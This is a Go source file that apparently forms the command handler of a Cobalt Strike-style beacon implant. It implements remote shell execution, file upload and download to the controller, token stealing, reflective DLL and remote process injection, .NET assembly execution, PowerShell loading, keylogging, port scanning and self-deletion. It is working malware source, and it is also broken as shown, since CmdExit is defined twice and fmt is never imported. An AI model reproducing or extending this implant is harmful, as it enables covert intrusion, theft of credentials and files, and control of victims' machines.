package services

import (
	"bytes"
	"errors"
	"io"
	"main/config"
	"main/crypt"
	"main/packet"
	"main/util"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"
)

func CmdShell(cmdBuf []byte, Token uintptr) ([]byte, error) {
	shellPath, shellBuf, err := packet.ParseCommandShell(cmdBuf)
	if err != nil {
		return nil, err
	}
	var result []byte
	if shellPath == "" && runtime.GOOS == "windows" {
		result, err = packet.Run(shellBuf, Token)
		return result, err
	} else {
		result, err = packet.Shell(shellPath, shellBuf, Token)
		return result, err
	}
}

func CmdUploadStart(cmdBuf []byte) ([]byte, error) {
	filePath, fileData := packet.ParseCommandUpload(cmdBuf)
	filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
	result, err := packet.Upload(filePathStr, fileData)
	if err != nil {
		return nil, err
	}
	return result, nil
}

func CmdUploadLoop(cmdBuf []byte) ([]byte, error) {
	filePath, fileData := packet.ParseCommandUpload(cmdBuf)
	filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
	result, err := packet.Upload(filePathStr, fileData)
	if err != nil {
		return nil, err
	}
	return result, nil
}

func CmdDownload(cmdBuf []byte) ([]byte, error) {
	filePath := cmdBuf
	strFilePath := string(filePath)
	strFilePath = strings.ReplaceAll(strFilePath, "\\", "/")
	fileInfo, err := os.Stat(strFilePath)
	if err != nil {
		return nil, err
	}
	fileLen := fileInfo.Size()
	test := int(fileLen)
	fileLenBytes := packet.WriteInt(test)
	requestID := crypt.RandomInt(10000, 99999)
	requestIDBytes := packet.WriteInt(requestID)
	result := util.BytesCombine(requestIDBytes, fileLenBytes, filePath)
	packet.DataProcess(2, result)

	fileHandle, err := os.Open(strFilePath)
	if err != nil {
		return nil, err
	}
	var fileContent []byte
	fileBuf := make([]byte, 1024*1024)
	for {
		n, err := fileHandle.Read(fileBuf)
		if err != nil && err != io.EOF {
			break
		}
		if n == 0 {
			break
		}
		fileContent = fileBuf[:n]
		result = util.BytesCombine(requestIDBytes, fileContent)
		packet.DataProcess(8, result)
	}
	packet.DataProcess(9, requestIDBytes)
	return []byte("Download " + strFilePath + " success"), nil

}

func CmdFileBrowse(cmdBuf []byte) ([]byte, error) {
	return packet.File_Browse(cmdBuf)
}

func CmdCd(cmdBuf []byte) ([]byte, error) {
	return packet.ChangeCurrentDir(cmdBuf)
}

func CmdSleep(cmdBuf []byte) ([]byte, error) {
	sleep := packet.ReadInt(cmdBuf[:4])
	if sleep != 'd' {
		config.WaitTime = time.Duration(sleep) * time.Millisecond
		return []byte("Sleep time changes to " + strconv.Itoa(int(sleep)/1000) + " seconds"), nil
	}
	return nil, nil
}

func CmdPause(cmdbuf []byte) ([]byte, error) {
	pause := packet.ReadInt(cmdbuf)
	time.Sleep(time.Duration(pause) * time.Millisecond)
	return []byte(fmt.Sprintf("Pause for %d millisecond", pause)), nil
}

func CmdPwd() ([]byte, error) {
	return packet.GetCurrentDirectory()
}

func CmdSpawnX64(cmdBuf []byte) ([]byte, error) {
	cmdString := string(cmdBuf)
	cmdString = strings.Replace(cmdString, "ExitProcess", "ExitThread"+"\x00", -1)
	return packet.Spawn_X64([]byte(cmdString))
}

func CmdSpawnX86(cmdBuf []byte) ([]byte, error) {
	cmdString := string(cmdBuf)
	cmdString = strings.Replace(cmdString, "ExitProcess", "ExitThread"+"\x00", -1)
	return packet.Spawn_X86([]byte(cmdString))
}

func CmdExecute(cmdBuf []byte, Token uintptr) ([]byte, error) {
	return packet.Execute(cmdBuf, Token)
}

func CmdGetUid() ([]byte, error) {
	return packet.GetUid()
}

func CmdStealToken(cmdBuf []byte) (uintptr, []byte, error) {
	pid := packet.ReadInt(cmdBuf[:4])
	return packet.Steal_token(pid)
}

func CmdPs(cmdBuf []byte) ([]byte, error) {
	return packet.ListProcess(cmdBuf)
}

func CmdKill(cmdBuf []byte) ([]byte, error) {
	pid := packet.ReadInt(cmdBuf[:4])
	return packet.KillProcess(pid)
}

func CmdMkdir(cmdBuf []byte) ([]byte, error) {
	return packet.Mkdir(cmdBuf)
}

func CmdDrives() ([]byte, error) {
	return packet.Drives()
}

func CmdRm(cmdBuf []byte) ([]byte, error) {
	return packet.Remove(cmdBuf)
}

func CmdCp(cmdBuf []byte) ([]byte, error) {
	return packet.Copy(cmdBuf)
}

func CmdMv(cmdBuf []byte) ([]byte, error) {
	return packet.Move(cmdBuf)
}

func CmdRun2self(Token uintptr) (uintptr, []byte, error) {
	flag, err := packet.Run2self()
	if err != nil {
		return Token, nil, err
	}
	if flag {
		return 0, nil, err
	} else {
		return Token, nil, err
	}
}

func CmdMakeToken(cmdBuf []byte) (uintptr, []byte, error) {
	Token, err := packet.Make_token(cmdBuf)
	if err != nil {
		return 0, nil, err
	}
	return Token, []byte("Make token success"), nil
}

func CmdHandlerJob(cmdBuf []byte) ([]byte, error) {
	return packet.HandlerJob(cmdBuf)
}

func CmdPortscanX64(cmdBuf []byte) ([]byte, error) {
	cmdBuf = bytes.Replace(cmdBuf, []byte("ExitProcess"), []byte("ExitThread"+"\x00"), -1)
	return packet.Spawn_X64(cmdBuf)
}

func CmdPortscanX86(cmdBuf []byte) ([]byte, error) {
	cmdBuf = bytes.Replace(cmdBuf, []byte("ExitProcess"), []byte("ExitThread"+"\x00"), -1)
	return packet.Spawn_X86(cmdBuf)
}

func CmdKeylogger(cmdBuf []byte) ([]byte, error) {
	return packet.HandlerJob(cmdBuf)
}

func CmdExecuteAssemblyX64(cmdBuf []byte) ([]byte, error) {
	_, _, _, description, data, dll, err := ParseExecAsm(cmdBuf)
	if err != nil {
		return nil, errors.New("parameter wrong")
	}
	if string(description) != ".NET assembly" { // data is parameter, dll is reflectivedll
		dll = bytes.ReplaceAll(dll, []byte("ExitProcess"), []byte("ExitThread\x00"))
		return packet.DllInjectSelf(data, dll)
	}
	//data is Csharp, dll is environment
	data = bytes.ReplaceAll(data, []byte("ExitProcess"), []byte("ExitThread\x00"))
	dataBuf := bytes.NewBuffer(data)
	data, _ = util.ParseAnArg(dataBuf)
	dataParam := dataBuf.Bytes()
	param := string(dataParam)

	param = strings.ReplaceAll(param, "\x00", "")
	param = strings.Trim(param, " ")
	params := strings.Split(param, " ")
	return packet.ExecuteAssembly(data, params)
}

func CmdExecuteAssemblyX86(cmdBuf []byte) ([]byte, error) {
	_, _, _, description, data, dll, err := ParseExecAsm(cmdBuf)
	if err != nil {
		return nil, errors.New("parameter wrong")
	}
	if string(description) != ".NET assembly" { // data is parameter, dll is reflectivedll
		dll = bytes.ReplaceAll(dll, []byte("ExitProcess"), []byte("ExitThread\x00"))
		return packet.DllInjectSelf(data, dll)
	}
	//data is Csharp, dll is environment
	data = bytes.ReplaceAll(data, []byte("ExitProcess"), []byte("ExitThread\x00"))
	dataBuf := bytes.NewBuffer(data)
	data, _ = util.ParseAnArg(dataBuf)
	dataParam := dataBuf.Bytes()
	param := string(dataParam)

	param = strings.ReplaceAll(param, "\x00", "")
	param = strings.Trim(param, " ")
	params := strings.Split(param, " ")
	return packet.ExecuteAssembly(data, params)
}

func ParseExecAsm(b []byte) (uint16, uint16, uint32, []byte, []byte, []byte, error) {
	buf := bytes.NewBuffer(b)

	callbackTypeByte := make([]byte, 2)
	sleepTimeByte := make([]byte, 2)
	offset := make([]byte, 4)
	_, _ = buf.Read(callbackTypeByte)
	_, _ = buf.Read(sleepTimeByte)
	_, _ = buf.Read(offset)
	callBackType := packet.ReadShort(callbackTypeByte)
	sleepTime := packet.ReadShort(sleepTimeByte)
	offSet := packet.ReadInt(offset)
	description, err := util.ParseAnArg(buf)
	csharp, err := util.ParseAnArg(buf)
	dll := buf.Bytes()
	return callBackType, sleepTime, offSet, description, csharp, dll, err
}

func CmdImportPowershell(cmdBuf []byte) ([]byte, error) {
	return packet.PowershellImport(cmdBuf)
}

func CmdPowershellPort(cmdBuf []byte, powershellImport []byte) ([]byte, error) {
	return packet.PowershellPort(cmdBuf, powershellImport)
}

func CmdInjectX64(cmdBuf []byte) ([]byte, error) {
	if strings.Contains(string(cmdBuf), "ReflectiveLoader") {
		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("ExitProcess"), []byte("ExitThread\x00"))
		return packet.DllInjectSelf([]byte("\x00"), cmdBuf[8:])
	}
	return packet.InjectProcessRemote(cmdBuf)
}

func CmdInjectX86(cmdBuf []byte) ([]byte, error) {
	if strings.Contains(string(cmdBuf), "ReflectiveLoader") {
		cmdBuf = bytes.ReplaceAll(cmdBuf, []byte("ExitProcess"), []byte("ExitThread\x00"))
		return packet.DllInjectSelf([]byte("\x00"), cmdBuf[8:])
	}
	return packet.InjectProcessRemote(cmdBuf)
}

func CmdExit() ([]byte, error) {
	if config.DeleteSelf {
		_, err := packet.DeleteSelf()
		if err != nil {
			return nil, err
		}
		os.Exit(0)
	}
	os.Exit(0)
	return []byte("success exit"), nil
}

func CmdExit() ([]byte, error) {
	if config.DeleteSelf {
		_, err := packet.DeleteSelf()
		if err != nil {
			return nil, err
		}
		os.Exit(0)
	}
	os.Exit(0)
	return []byte("success exit"), nil
}
